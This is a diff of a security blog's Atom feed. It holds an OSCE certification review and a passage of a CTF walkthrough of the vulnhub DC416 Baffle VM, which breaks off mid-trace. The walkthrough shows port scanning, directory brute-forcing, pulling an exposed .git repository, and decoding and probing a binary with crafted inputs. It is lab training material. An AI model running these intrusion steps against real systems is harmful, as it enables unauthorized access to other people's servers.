@@ -1,4 +1,980 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-02-24T19:06:05-06:00</updated><id>http://localhost:4000/</id><title type="html">T0w3ntum</title><subtitle>Comming soon</subtitle><entry><title type="html">IMF: 1</title><link href="http://localhost:4000/2016-11-06/IMF" rel="alternate" type="text/html" title="IMF: 1" /><published>2016-11-06T00:00:00-05:00</published><updated>2016-11-06T00:00:00-05:00</updated><id>http://localhost:4000/2016-11-06/IMF</id><content type="html" xml:base="http://localhost:4000/2016-11-06/IMF">&lt;h2 id=&quot;imf-1-walkthrough&quot;&gt;IMF: 1 Walkthrough&lt;/h2&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-02-24T19:20:46-06:00</updated><id>http://localhost:4000/</id><title type="html">T0w3ntum</title><subtitle>Comming soon</subtitle><entry><title type="html">I Fought the OSCE and the OSCE…</title><link href="http://localhost:4000/2017-07-17/fought-the-OSCE" rel="alternate" type="text/html" title="I Fought the OSCE and the OSCE..." /><published>2017-07-17T00:00:00-05:00</published><updated>2017-07-17T00:00:00-05:00</updated><id>http://localhost:4000/2017-07-17/fought-the-OSCE</id><content type="html" xml:base="http://localhost:4000/2017-07-17/fought-the-OSCE">&lt;p&gt;It’s time again to review yet another Offensive Security cert. I’ve been a bit delayed on this post. I was hoping to have it out sooner, but as many of you know I failed my first attempt.&lt;/p&gt;
+
+&lt;h1 id=&quot;cracking-the-perimeter&quot;&gt;Cracking the Perimeter&lt;/h1&gt;
+
+&lt;p&gt;Cracking the Perimeter (CTP) Is &lt;a href=&quot;https://www.offensive-security.com/information-security-training/cracking-the-perimeter/&quot;&gt;Offensive Securities&lt;/a&gt; course that focuses on advanced attack vectors and exploit development. Where the PWK is a mile wide and an inch deep, the CTP is an inch wide and a mile deep. I won’t dive into specifics on what is covered, feel free to check out the official website for that.&lt;/p&gt;
+
+&lt;h2 id=&quot;preparation&quot;&gt;Preparation&lt;/h2&gt;
+
+&lt;p&gt;Before I dove into the CTP I did some pre-study on the various topics found in the syllabus. The two most used resources were &lt;a href=&quot;http://www.fuzzysecurity.com&quot;&gt;FuzzySecurity&lt;/a&gt; and &lt;a href=&quot;https://www.corelan.be&quot;&gt;Corelan&lt;/a&gt;, both cover various topics related to exploit development, some of those topics are outside the scope of the CTP, but I went through the majority of them anyway. I highly recommend you do the same if you are considering taking the course, having an understanding before hand will help you grasp the various concepts within the material.&lt;/p&gt;
+
+&lt;p&gt;A few books I also recommend are:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;The Art of Exploitation&lt;/li&gt;
+  &lt;li&gt;The Shellcoders Handbook&lt;/li&gt;
+  &lt;li&gt;The Hacker Playbook 2&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The last one is useful for even the OSCP, but helps to have a more advanced understanding of web application attacks. While writing your own shellcode isn’t extensively covered in the CTP, I highly recommend knowing the basics.&lt;/p&gt;
+
+&lt;h1 id=&quot;osce-attempt-1&quot;&gt;OSCE Attempt 1&lt;/h1&gt;
+
+&lt;p&gt;NO! Just…I don’t have much to say on this. I failed hard. I only knocked out one challenge within the first couple of hours, but the remaining hours were spent on one hard challenge.
+You might often read that “Everything you need for the exam is in the course material” and this is true. Everything you need to learn is there, but it’s up to you to put it together. That challenge killed me for 36 hours.&lt;/p&gt;
+
+&lt;p&gt;I simply couldn’t see what I needed to see, in my final hours I went to bed feeling a bit down and woke up with an hour to spare. Still nothing, VPN drops, exam is over….30 minutes later as I review notes and screenshots I have a “Oh…There it is.” moment.&lt;/p&gt;
+
+&lt;h1 id=&quot;osce-attempt-2&quot;&gt;OSCE Attempt 2&lt;/h1&gt;
+
+&lt;p&gt;Start: 9:00 AM
+Finish: 1:30 PM&lt;/p&gt;
+
+&lt;p&gt;Yup, the second attempt went much smoother than the first. I spent a few months really studying and recreating various exploits from exploit-db. I dove into ASM to get more comfortable with reverse engineering, and I participated in several CTF’s where I focused on reverse engineering challenges. I think all of this really helped in my second attempt.&lt;/p&gt;
+
+&lt;h1 id=&quot;takeaway&quot;&gt;Takeaway&lt;/h1&gt;
+
+&lt;p&gt;Unlike the PWK, the CTP doesn’t give you a lot of info at once. It gives you a few things and you are encouraged to take what you have been shown and get more comfortable with it. The old “More than one way to skin a cat” phrase comes to mind. Just because the material shows you one way to do an exploit, you should try to do it different ways. Experiment with it, see what works and what doesn’t. I encourage everyone to take that approach to anything you do. Just because you were shown one way to do something doesn’t mean it’s the only way to do it. You might find a better way, or a way that is easier for you.&lt;/p&gt;
+
+&lt;p&gt;That may not be the most in depth review of the CTP, but it’s advise I want everyone to take.&lt;/p&gt;</content><author><name>T0w3ntum</name></author><summary type="html">It’s time again to review yet another Offensive Security cert. I’ve been a bit delayed on this post. I was hoping to have it out sooner, but as many of you know I failed my first attempt.</summary></entry><entry><title type="html">DC416 Baffle Walkthrough</title><link href="http://localhost:4000/2017-01-07/DC416" rel="alternate" type="text/html" title="DC416 Baffle Walkthrough" /><published>2017-01-07T00:00:00-06:00</published><updated>2017-01-07T00:00:00-06:00</updated><id>http://localhost:4000/2017-01-07/DC416</id><content type="html" xml:base="http://localhost:4000/2017-01-07/DC416">&lt;p&gt;This is one of the harder VM’s I’ve worked on in a while and it taught me many new skills! Good job putting this one together vulnhub CTF team!&lt;/p&gt;
+
+&lt;h2 id=&quot;start&quot;&gt;START!&lt;/h2&gt;
+
+&lt;p&gt;First, some basic enumeration. Found a .git directory on the site that looked interesting so I downloaded it’s contents and took a look at the diffs. I’ve cut a good portion of the output below.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;400 &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; 192.168.1.69
+
+Starting Nmap 7.25BETA2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2016-12-10 08:42 EST
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;baffle &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;192.168.1.69&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.0013s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 65532 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+6969/tcp open  acmsoda
+MAC Address: 00:0C:29:D3:61:63 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;VMware&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;4.53 seconds
+root@kali:~#
+root@kali:~#
+root@kali:~# curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; http://192.168.1.69
+&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;DOCTYPE html&amp;gt;
+&amp;lt;html&amp;gt;
+&amp;lt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&amp;lt;meta http-equiv&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Content-Type&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;text/html; charset=utf-8&quot;&lt;/span&gt; /&amp;gt;
+&amp;lt;title&amp;gt;baffle&amp;lt;/title&amp;gt;
+&amp;lt;&lt;span class=&quot;nb&quot;&gt;link &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;rel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;styles.css&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;text/css&quot;&lt;/span&gt; /&amp;gt;
+&amp;lt;/head&amp;gt;
+&amp;lt;body&amp;gt;
+
+&amp;lt;div &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;container&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+
+&amp;lt;h1&amp;gt;DC416 : baffle&amp;lt;/h1&amp;gt;
+&amp;lt;h3&amp;gt;Engagement Rules:&amp;lt;/h3&amp;gt;
+&amp;lt;ul&amp;gt;
+&amp;lt;li&amp;gt;No username/password bruteforcing is necessary&amp;lt;/li&amp;gt;
+&amp;lt;li&amp;gt;This box has &amp;lt;b&amp;gt;5&amp;lt;/b&amp;gt; flags&amp;lt;/li&amp;gt;
+&amp;lt;li&amp;gt;Flags are &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &amp;lt;b&amp;gt;FLAG&lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt;&amp;lt;/b&amp;gt; format&amp;lt;/li&amp;gt;
+&amp;lt;li&amp;gt;The goal is &amp;lt;b&amp;gt;not&amp;lt;/b&amp;gt; to get root. Get the flags and move on&amp;lt;/li&amp;gt;
+&amp;lt;li&amp;gt;Have fun&amp;lt;/li&amp;gt;
+&amp;lt;/ul&amp;gt;
+
+&amp;lt;img &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;logo&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;logo.png&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+
+&amp;lt;/div&amp;gt;
+
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+root@kali:~#
+root@kali:~# dirb http://192.168.1.69
+
+&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;
+DIRB v2.22    
+By The Dark Raver
+&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;
+
+START_TIME: Sat Dec 10 08:43:19 2016
+URL_BASE: http://192.168.1.69/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;
+
+GENERATED WORDS: 4612                                                          
+
+&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt; Scanning URL: http://192.168.1.69/ &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
++ http://192.168.1.69/.git/HEAD &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;CODE:200|SIZE:23&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                   
+
+&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;
+END_TIME: Sat Dec 10 08:43:26 2016
+DOWNLOADED: 4612 - FOUND: 1
+root@kali:~#
+root@kali:/tmp/baffle/192.168.1.69# wget &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-np&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; http://192.168.1.69/.git/objects/
+&lt;span class=&quot;nt&quot;&gt;--2016-12-10&lt;/span&gt; 09:29:06--  http://192.168.1.69/.git/objects/
+Connecting to 192.168.1.69:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: unspecified &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;text/html]
+Saving to: ë192.168.1.69/.git/objects/index.htmlí
+
+192.168.1.69/.git/objects/index.h     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &amp;lt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;                                                        &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;   2.29K  &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;.-KB/s    &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0s      
+
+...SNIP...
+
+192.168.1.69/.git/objects/e2/0f9a 100%[&lt;span class=&quot;o&quot;&gt;===========================================================&amp;gt;]&lt;/span&gt;      57  &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;.-KB/s    &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0s      
+
+2016-12-10 09:29:06 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.87 MB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - ë192.168.1.69/.git/objects/e2/0f9a337b6577af20e1d9d2d328d86536bd5086í saved &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;57/57]
+
+FINISHED &lt;span class=&quot;nt&quot;&gt;--2016-12-10&lt;/span&gt; 09:29:06--
+Total wall clock &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 0.2s
+Downloaded: 40 files, 16K &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.001s &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;14.5 MB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Converting links &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;192.168.1.69/.git/objects/06/index.html... 2-0
+Converting links &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;192.168.1.69/.git/objects/pack/index.html... 1-0
+Converting links &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;192.168.1.69/.git/objects/7e/index.html... 2-0
+Converting links &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;192.168.1.69/.git/objects/d7/index.html... 2-0
+Converting links &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;192.168.1.69/.git/objects/d5/index.html... 2-0
+Converting links &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;192.168.1.69/.git/objects/d1/index.html... 2-0
+Converting links &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;192.168.1.69/.git/objects/9b/index.html... 2-0
+Converting links &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;192.168.1.69/.git/objects/10/index.html... 2-0
+Converting links &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;192.168.1.69/.git/objects/8b/index.html... 2-0
+Converting links &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;192.168.1.69/.git/objects/7f/index.html... 3-0
+Converting links &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;192.168.1.69/.git/objects/index.html... 20-1
+Converting links &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;192.168.1.69/.git/objects/6f/index.html... 2-0
+Converting links &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;192.168.1.69/.git/objects/21/index.html... 2-0
+Converting links &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;192.168.1.69/.git/objects/ac/index.html... 2-0
+Converting links &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;192.168.1.69/.git/objects/91/index.html... 2-0
+Converting links &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;192.168.1.69/.git/objects/c2/index.html... 2-0
+Converting links &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;192.168.1.69/.git/objects/e2/index.html... 2-0
+Converting links &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;192.168.1.69/.git/objects/32/index.html... 2-0
+Converting links &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;192.168.1.69/.git/objects/info/index.html... 1-0
+Converting links &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;192.168.1.69/.git/objects/2f/index.html... 2-0
+Converting links &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;192.168.1.69/.git/objects/d3/index.html... 2-0
+Converted links &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;21 files &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.04 seconds.
+
+root@kali:/tmp# git clone 192.168.1.69/.git baffle
+Cloning into &lt;span class=&quot;s1&quot;&gt;'baffle'&lt;/span&gt;...
+&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+root@kali:/tmp# &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;baffle/
+root@kali:/tmp/baffle# &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt;
+total 16
+drwxr-xr-x  3 root root 4096 Dec 11 07:31 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+drwxrwxrwt 14 root root 4096 Dec 11 07:31 ..
+drwxr-xr-x  8 root root 4096 Dec 11 07:31 .git
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 root root  616 Dec 11 07:31 hellofriend.c
+
+…SNIP…
+
+commit d38ce2e28e32aa7787d5e8a2cb83d3f75c988eca
+Author: alice &amp;lt;alice@baffle.me&amp;gt;
+Date:   Mon Oct 17 14:55:07 2016 &lt;span class=&quot;nt&quot;&gt;-0400&lt;/span&gt;
+
+    Some assembly required
+
+diff &lt;span class=&quot;nt&quot;&gt;--git&lt;/span&gt; a/project.enc b/project.enc
+new file mode 100644
+index 0000000..7fe355b
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; /dev/null
++++ b/project.enc
+@@ &lt;span class=&quot;nt&quot;&gt;-0&lt;/span&gt;,0 +1,147 @@
++f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAUAZAAAAAAABAAAAAAAAAAPgYAAAAAAAAAAAAAEAAOAAI
++AEAAHwAcAAYAAAAFAAAAQAAAAAAAAABAAEAAAAAAAEAAQAAAAAAAwAEAAAAAAADAAQAAAAAAAAgA
++AAAAAAAAAwAAAAQAAAAAAgAAAAAAAAACQAAAAAAAAAJAAAAAAAAcAAAAAAAAABwAAAAAAAAAAQAA
++AAAAAAABAAAABQAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAFwLAAAAAAAAXAsAAAAAAAAAACAA
++AAAAAAEAAAAGAAAAYAsAAAAAAABgC2AAAAAAAGALYAAAAAAAYAIAAAAAAAB4BAAAAAAAAAAAIAAA
++AAAAAgAAAAYAAAB4CwAAAAAAAHgLYAAAAAAAeAtgAAAAAADQAQAAAAAAANABAAAAAAAACAAAAAAA
++AAAEAAAABAAAABwCAAAAAAAAHAJAAAAAAAAcAkAAAAAAAEQAAAAAAAAARAAAAAAAAAAEAAAAAAAA
+&amp;lt;Many more lines here&amp;gt;
+…SNIP…
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Looks like we some interesting code to work with. One I’m particularly interested in is commit d38ce2e28e32aa7787d5e8a2cb83d3f75c988eca. I checked out the commit and recreated the binary from it.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:/mnt/hgfs/kali64/baffle# git checkout d38ce2e28e32aa7787d5e8a2cb83d3f75c988eca
+
+…SNIP…
+
+HEAD is now at d38ce2e... Some assembly required
+root@kali:/mnt/hgfs/kali64/baffle# &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt;
+total 15
+drwxr-xr-x 1 501 dialout   136 Jan  2  2017 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+drwxr-xr-x 1 501 dialout   544 Jan  2  2017 ..
+drwxr-xr-x 1 501 dialout   442 Jan  2  2017 .git
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 501 dialout   857 Jan  2  2017 hellofriend.c
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 501 dialout 11315 Jan  2  2017 project.enc
+root@kali:/mnt/hgfs/kali64/baffle#
+root@kali:/mnt/hgfs/kali64/baffle# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;project.enc | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; project
+root@kali:/mnt/hgfs/kali64/baffle#
+root@kali:/mnt/hgfs/kali64/baffle# file project
+project: ELF 64-bit LSB executable, x86-64, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GNU/Linux 2.6.32, BuildID[sha1]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;8d8f87535451003b05db15d14d07818576813b49, not stripped
+root@kali:/mnt/hgfs/kali64/baffle#
+root@kali:/mnt/hgfs/kali64/baffle# &lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x project
+root@kali:/mnt/hgfs/kali64/baffle#
+root@kali:/mnt/hgfs/kali64/baffle# ./project
+&lt;span class=&quot;nb&quot;&gt;test
+&lt;/span&gt;root@kali:/mnt/hgfs/kali64/baffle#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So we have something, so let’s see what’s going on.&lt;/p&gt;
+
+&lt;p&gt;We can see a couple of compares in the disassembled code.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;|          0x004007af    837df401       cmp dword &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-local_1_4], 1    &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;0x1:4]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x2464c45
+|      ,&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;lt; 0x004007b3    0f8596000000   jne 0x40084f      
+
+...SNIP...
+
+|     &lt;span class=&quot;sb&quot;&gt;``&lt;/span&gt;-&amp;gt; 0x0040084f    837df402       cmp dword &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rbp-local_1_4], 2    &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;0x2:4]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0x102464c
+|    ,&lt;span class=&quot;o&quot;&gt;===&lt;/span&gt;&amp;lt; 0x00400853    0f8597000000   jne 0x4008f0   
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;When we execute it through ltrace we can see some interesting things. First sending in 0x02 and flag.txt gives us a seg fault, sending in 0x01 and flag.txt seems to be cutting off our flag.txt.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:/mnt/hgfs/kali64/baffle# python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'print &quot;\x01&quot;*2 + &quot;flag.txt&quot;'&lt;/span&gt; | ltrace ./project
+__libc_start_main&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x4008f7, 1, 0x7fffb82dc7b8, 0x400980 &amp;lt;unfinished ...&amp;gt;
+setbuf&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x7f7d937ea620, 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                                                                      &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &amp;lt;void&amp;gt;
+memset&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x7fffb82dbef0, &lt;span class=&quot;s1&quot;&gt;'\0'&lt;/span&gt;, 2000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                                                             &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0x7fffb82dbef0
+&lt;span class=&quot;nb&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0, &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;01flag.txt&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;, 2000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                                                            &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 11
+memset&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x7fffb82dbac0, &lt;span class=&quot;s1&quot;&gt;'\0'&lt;/span&gt;, 500&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                                                              &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0x7fffb82dbac0
+memset&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x7fffb82db8b0, &lt;span class=&quot;s1&quot;&gt;'\0'&lt;/span&gt;, 10&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                                                               &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0x7fffb82db8b0
+memcpy&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x7fffb82dbac0, &lt;span class=&quot;s2&quot;&gt;&quot;fl&quot;&lt;/span&gt;, 2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                                                                &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0x7fffb82dbac0
+fopen&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;fl&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;r&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                                                                               &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
++++ exited &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;status 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; +++
+root@kali:/mnt/hgfs/kali64/baffle#
+root@kali:/mnt/hgfs/kali64/baffle# python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'print &quot;\x02&quot;*2 + &quot;flag.txt&quot;'&lt;/span&gt; | ltrace ./project
+__libc_start_main&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x4008f7, 1, 0x7fffbc7315a8, 0x400980 &amp;lt;unfinished ...&amp;gt;
+setbuf&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x7f6c6ccb3620, 0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                                                                      &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &amp;lt;void&amp;gt;
+memset&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x7fffbc730ce0, &lt;span class=&quot;s1&quot;&gt;'\0'&lt;/span&gt;, 2000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                                                             &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0x7fffbc730ce0
